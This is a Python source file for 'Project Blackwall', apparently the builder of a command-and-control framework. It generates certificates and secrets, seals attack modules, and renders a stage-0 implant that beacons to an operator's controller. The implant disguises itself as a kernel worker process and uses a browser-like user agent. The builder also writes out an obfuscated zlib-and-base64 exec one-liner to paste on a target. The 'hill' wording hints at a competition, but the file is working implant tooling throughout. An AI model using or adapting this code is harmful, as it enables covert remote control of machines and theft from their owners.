#!/usr/bin/env python3
"""PROJECT BLACKWALL // C2 builder.

Creates the PKI, rotates secrets, seals every module and renders a
self-contained stage-0 implant with a pinned server certificate.
"""

import argparse
import base64
import hashlib
import ipaddress
import json
import os
import shutil
import subprocess
import sys
import time
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
PROJECT = os.path.abspath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, HERE)

import c2_common as C  # noqa: E402

DEFAULT_DIR = os.path.join(PROJECT, "artifacts", "c2")
TEMPLATE = os.path.join(HERE, "c2_implant.py")
MODULES = os.path.join(HERE, "modules")


def style(msg):
    print("%s[C2]%s %s%s%s" % (
        "\033[1;38;2;255;65;0m", "\033[0m", "\033[38;2;255;130;130m", msg, "\033[0m"
    ), flush=True)


def quote(text):
    print('%s%s"%s"%s' % ("\033[38;2;60;10;15m", "\033[3m", text, "\033[0m"), flush=True)


def ensure_dirs(root):
    for sub in ("certs", "modules", "stage", "loot", "state"):
        os.makedirs(os.path.join(root, sub), exist_ok=True)
    os.makedirs(root, exist_ok=True)


def san_value(hosts):
    entries = []
    for host in hosts:
        host = (host or "").strip()
        if not host:
            continue
        try:
            ipaddress.ip_address(host)
            entry = "IP:" + host
        except ValueError:
            entry = "DNS:" + host
        if entry not in entries:
            entries.append(entry)
    if "IP:127.0.0.1" not in entries:
        entries.append("IP:127.0.0.1")
    if "DNS:localhost" not in entries:
        entries.append("DNS:localhost")
    return ",".join(entries)


def generate_cert(root, hosts, force=False, days=3650):
    cert = os.path.join(root, "certs", "server.crt")
    key = os.path.join(root, "certs", "server.key")
    if os.path.exists(cert) and os.path.exists(key) and not force:
        style("pki: existing certificate reused")
        return cert, key

    openssl = shutil.which("openssl")
    if not openssl:
        raise SystemExit("openssl is required to build the C2 PKI")

    os.makedirs(os.path.dirname(cert), exist_ok=True)
    cmd = [
        openssl,
        "req",
        "-x509",
        "-newkey",
        "rsa:2048",
        "-sha256",
        "-days",
        str(days),
        "-nodes",
        "-keyout",
        key,
        "-out",
        cert,
        "-subj",
        "/C=XX/O=Blackwall/OU=Cynosure/CN=blackwall-c2",
        "-addext",
        "subjectAltName=" + san_value(hosts),
        "-addext",
        "basicConstraints=critical,CA:TRUE",
        "-addext",
        "keyUsage=critical,digitalSignature,keyEncipherment,keyCertSign",
        "-addext",
        "extendedKeyUsage=serverAuth,clientAuth",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        raise SystemExit("openssl failed: %s" % (result.stderr or result.stdout).strip())
    os.chmod(key, 0o600)
    os.chmod(cert, 0o644)
    style("pki: self-signed certificate generated (RSA-2048, SAN %s)" % san_value(hosts))
    return cert, key


def generate_client_cert(root, cert, key, force=False, days=3650):
    """Client certificate signed by the same pinned CA (optional mTLS)."""
    cpath = os.path.join(root, "certs", "client.crt")
    kpath = os.path.join(root, "certs", "client.key")
    if os.path.exists(cpath) and os.path.exists(kpath) and not force:
        return cpath, kpath
    openssl = shutil.which("openssl")
    if not openssl:
        raise SystemExit("openssl is required to build the C2 PKI")
    csr = os.path.join(root, "certs", "client.csr")
    ext = os.path.join(root, "certs", "client.ext")
    with open(ext, "w", encoding="ascii") as fh:
        fh.write("basicConstraints=critical,CA:FALSE\n")
        fh.write("keyUsage=critical,digitalSignature,keyEncipherment\n")
        fh.write("extendedKeyUsage=clientAuth\n")
    subprocess.run(
        [
            openssl, "req", "-new", "-newkey", "rsa:2048", "-nodes",
            "-keyout", kpath, "-out", csr,
            "-subj", "/C=XX/O=Blackwall/OU=Implant/CN=blackwall-implant",
        ],
        check=True, capture_output=True, text=True,
    )
    subprocess.run(
        [
            openssl, "x509", "-req", "-in", csr, "-CA", cert, "-CAkey", key,
            "-CAcreateserial", "-out", cpath, "-days", str(days), "-sha256",
            "-extfile", ext,
        ],
        check=True, capture_output=True, text=True,
    )
    for path in (csr, ext):
        try:
            os.unlink(path)
        except OSError:
            pass
    os.chmod(kpath, 0o600)
    os.chmod(cpath, 0o644)
    style("pki: client certificate generated (mTLS)")
    return cpath, kpath


def load_or_make_secrets(root, force=False):
    path = os.path.join(root, "secrets.json")
    data = C.read_json(path, {})
    changed = False
    if force or not data.get("implant_secret"):
        data["implant_secret"] = C.b64e(os.urandom(32))
        changed = True
    if force or not data.get("admin_secret"):
        data["admin_secret"] = C.b64e(os.urandom(32))
        changed = True
    if force or "created" not in data:
        data["created"] = int(time.time())
        changed = True
    if changed:
        C.write_json(path, data, 0o600)
        style("secrets: rotated (%s)" % path)
    else:
        style("secrets: existing keys reused")
    return data


def parse_meta(raw, fallback_desc=""):
    desc = fallback_desc
    req = []
    needs_secret = False
    for line in raw.splitlines()[:12]:
        text = line.strip()
        for prefix in ("# DESC:", "// DESC:", "# desc:", "// desc:"):
            if text.startswith(prefix):
                desc = text[len(prefix):].strip()
        for prefix in ("# REQ:", "// REQ:", "# req:", "// req:"):
            if text.startswith(prefix):
                req = [x.strip() for x in text[len(prefix):].split(",") if x.strip()]
        for prefix in ("# SECRET:", "// SECRET:", "# NEEDS_SECRET:", "// NEEDS_SECRET:"):
            if text.startswith(prefix):
                needs_secret = text[len(prefix):].strip().lower() in ("1", "yes", "true")
    return desc, req, needs_secret


def pack_modules(root, secret_b64, modules_dir=MODULES):
    secret = C.b64d(secret_b64)
    outdir = os.path.join(root, "modules")
    manifest_path = os.path.join(root, "modules.json")
    os.makedirs(outdir, exist_ok=True)
    old = C.read_json(manifest_path, {})
    old_modules = old.get("modules", {}) if isinstance(old, dict) else {}

    manifest = {}
    for name in sorted(os.listdir(modules_dir)):
        path = os.path.join(modules_dir, name)
        if not os.path.isfile(path) or name.startswith("."):
            continue
        base, ext = os.path.splitext(name)
        ext = ext.lower()
        if ext not in (".sh", ".py", ".elf", ".bin"):
            continue
        raw = open(path, "rb").read()
        if not raw:
            continue
        kind = {".sh": "sh", ".py": "py", ".elf": "elf", ".bin": "elf"}[ext]
        desc, req, needs_secret = parse_meta(raw.decode("utf-8", "replace"), base)
        blob = C.seal(secret, raw, b"module:" + base.encode())
        blob_path = os.path.join(outdir, base + ".bwm")
        with open(blob_path, "wb") as fh:
            fh.write(blob)
        os.chmod(blob_path, 0o600)
        manifest[base] = {
            "name": base,
            "desc": desc or base,
            "kind": kind,
            "requires": req,
            "needs_secret": needs_secret,
            "size": len(raw),
            "sealed": len(blob),
            "sha256": hashlib.sha256(raw).hexdigest(),
            "file": base + ".bwm",
        }
        style("module: %-14s %5d B -> %5d B sealed" % (base, len(raw), len(blob)))

    # Keep modules added at runtime through the admin API.
    for name, meta in old_modules.items():
        if name in manifest:
            continue
        blob_path = os.path.join(outdir, meta.get("file", name + ".bwm"))
        if os.path.exists(blob_path):
            manifest[name] = meta

    doc = {
        "version": C.PROTO,
        "created": int(time.time()),
        "modules": manifest,
    }
    C.write_json(manifest_path, doc, 0o600)
    return doc


def render_stage(root, cfg, cert_path):
    if not os.path.exists(TEMPLATE):
        raise SystemExit("implant template missing: %s" % TEMPLATE)

    source = open(TEMPLATE, "r", encoding="utf-8").read()
    blob = base64.b64encode(
        json.dumps(cfg, separators=(",", ":"), sort_keys=True).encode("utf-8")
    ).decode("ascii")
    if "__BW_CFG_B64__" not in source:
        raise SystemExit("implant template has no __BW_CFG_B64__ marker")
    staged = source.replace("__BW_CFG_B64__", blob)

    stage_dir = os.path.join(root, "stage")
    os.makedirs(stage_dir, exist_ok=True)
    stage_path = os.path.join(stage_dir, "stage0.py")
    with open(stage_path, "w", encoding="utf-8") as fh:
        fh.write(staged)
    os.chmod(stage_path, 0o700)

    packed = zlib.compress(staged.encode("utf-8"), 9)
    b64 = base64.b64encode(packed).decode("ascii")
    with open(os.path.join(stage_dir, "stage0.b64"), "w", encoding="ascii") as fh:
        fh.write(b64 + "\n")
    os.chmod(os.path.join(stage_dir, "stage0.b64"), 0o600)

    one_liner = (
        "python3 -c \"import base64,zlib;exec(zlib.decompress("
        "base64.b64decode('%s')))\"" % b64
    )
    with open(os.path.join(stage_dir, "deploy.txt"), "w", encoding="utf-8") as fh:
        fh.write("PROJECT BLACKWALL // STAGE-0 DELIVERY\n\n")
        fh.write("raw stage: %s\n" % stage_path)
        fh.write("size:      %d B (sealed zlib+b64: %d B)\n\n" % (len(staged), len(b64)))
        fh.write("one-liner (paste on the hill):\n%s\n\n" % one_liner)
        fh.write("file drop:\n")
        fh.write("  base64 -d stage0.b64 | python3 -c 'import zlib,sys;exec(zlib.decompress(sys.stdin.buffer.read()))'\n")
    os.chmod(os.path.join(stage_dir, "deploy.txt"), 0o600)
    return stage_path, one_liner, len(packed), len(b64)


def build(args):
    root = os.path.abspath(args.dir)
    ensure_dirs(root)

    hosts = [args.host] + list(args.san or [])
    if args.url:
        try:
            from urllib.parse import urlparse

            parsed = urlparse(args.url)
            if parsed.hostname:
                hosts.append(parsed.hostname)
        except ValueError:
            pass
    cert, key = generate_cert(root, hosts, force=args.rotate)
    secrets = load_or_make_secrets(root, force=args.rotate)
    client_cert = client_key = ""
    if args.mtls:
        client_cert, client_key = generate_client_cert(root, cert, key, force=args.rotate)

    manifest = pack_modules(root, secrets["implant_secret"], args.modules_dir)
    active = [x.strip() for x in (args.start_modules or "").split(",") if x.strip()]
    unknown = [x for x in active if x not in manifest["modules"]]
    if unknown:
        style("warning: start modules not found: %s" % ", ".join(unknown))
    active = [x for x in active if x in manifest["modules"]]

    url = args.url or "https://%s:%d" % (args.host, args.port)
    pem = open(cert, "r", encoding="ascii").read()
    fp = C.fingerprint_pem(pem)

    cfg = {
        "url": url,
        "secret": secrets["implant_secret"],
        "ca_pem": pem,
        "fingerprint": fp,
        "poll": int(args.poll),
        "jitter": int(args.jitter),
        "start_modules": active,
        "user_agent": args.user_agent,
        "timeout": int(args.timeout),
        "disguise": args.disguise,
        "dry_run": 1 if args.dry_run else 0,
        "max_output": 262144,
    }
    if args.mtls:
        cfg["client_cert_pem"] = open(client_cert, "r", encoding="ascii").read()
        cfg["client_key_pem"] = open(client_key, "r", encoding="ascii").read()
    env_map = {}
    for item in args.env or []:
        if "=" not in item:
            continue
        env_key, env_value = item.split("=", 1)
        if env_key.startswith("BW_"):
            env_map[env_key] = env_value
    cfg["env"] = env_map
    default_prefix = "/tmp/blackwall-c2-dry" if args.dry_run else "/usr/local/sbin/blk_kit"
    cfg["env"].setdefault("BW_PREFIX_DIR", default_prefix)

    stage_path, one_liner, zsize, b64size = render_stage(root, cfg, cert)

    config_doc = {
        "version": C.PROTO,
        "url": url,
        "host": args.host,
        "port": int(args.port),
        "cert": cert,
        "key": key,
        "fingerprint": fp,
        "poll": int(args.poll),
        "jitter": int(args.jitter),
        "start_modules": active,
        "mtls": bool(args.mtls),
        "created": int(time.time()),
    }
    C.write_json(os.path.join(root, "config.json"), config_doc, 0o600)
    C.write_json(
        os.path.join(root, "operator.json"),
        {
            "url": url,
            "admin_secret": secrets["admin_secret"],
            "ca": cert,
            "fingerprint": fp,
            "client_cert": client_cert or "",
            "client_key": client_key or "",
        },
        0o600,
    )
    # The server also needs to know about mTLS and the public URL.
    C.write_json(
        os.path.join(root, "server.json"),
        {
            "url": url,
            "host": args.host,
            "port": int(args.port),
            "cert": cert,
            "key": key,
            "mtls": bool(args.mtls),
            "mtls_ca": cert if args.mtls else "",
            "poll": int(args.poll),
            "jitter": int(args.jitter),
            "start_modules": active,
            "dry_run": 1 if args.dry_run else 0,
        },
        0o600,
    )

    style("build complete")
    style("  url:         %s" % url)
    style("  fingerprint: %s" % fp)
    style("  stage:       %s (%d B raw, %d B zlib, %d B b64)" % (stage_path, os.path.getsize(stage_path), zsize, b64size))
    style("  one-liner:   %s" % one_liner[:120] + ("..." if len(one_liner) > 120 else ""))
    style("  modules:     %s" % ", ".join(sorted(manifest["modules"])) or "none")
    style("  start set:   %s" % ", ".join(active))
    quote("The code behind me has begun to permeate the physical world.")
    return 0


def show(args):
    root = os.path.abspath(args.dir)
    config = C.read_json(os.path.join(root, "config.json"), {})
    manifest = C.read_json(os.path.join(root, "modules.json"), {})
    if not config:
        style("no build in %s, run: c2_pack.py build" % root)
        return 1
    print(json.dumps({"config": config, "modules": manifest.get("modules", {})}, indent=2))
    return 0


def main(argv=None):
    parser = argparse.ArgumentParser(description="PROJECT BLACKWALL C2 builder")
    sub = parser.add_subparsers(dest="cmd")

    b = sub.add_parser("build", help="generate PKI, secrets, modules and stage-0")
    b.add_argument("--dir", default=DEFAULT_DIR)
    b.add_argument("--host", required=True, help="controller address reachable from the hill")
    b.add_argument("--port", type=int, default=8443)
    b.add_argument("--url", default="", help="full public URL (overrides host/port)")
    b.add_argument("--san", action="append", default=[], help="extra SAN (repeatable)")
    b.add_argument("--modules-dir", default=MODULES)
    b.add_argument("--start-modules", default="recon", help="preloaded modules, comma separated")
    b.add_argument("--poll", type=int, default=20)
    b.add_argument("--jitter", type=int, default=8)
    b.add_argument("--timeout", type=int, default=15)
    b.add_argument("--user-agent", default="Mozilla/5.0 (X11; Linux x86_64) BW/1.0")
    b.add_argument("--disguise", default="kworker/0:1")
    b.add_argument("--mtls", action="store_true", help="require a client certificate")
    b.add_argument("--env", action="append", default=[], metavar="K=V", help="module environment (repeatable)")
    b.add_argument("--rotate", action="store_true", help="regenerate cert and secrets")
    b.add_argument("--dry-run", action="store_true", help="modules receive BW_DRY_RUN=1")
    b.set_defaults(func=build)

    s = sub.add_parser("show", help="print build metadata")
    s.add_argument("--dir", default=DEFAULT_DIR)
    s.set_defaults(func=show)

    args = parser.parse_args(argv)
    if not getattr(args, "func", None):
        parser.print_help()
        return 1
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
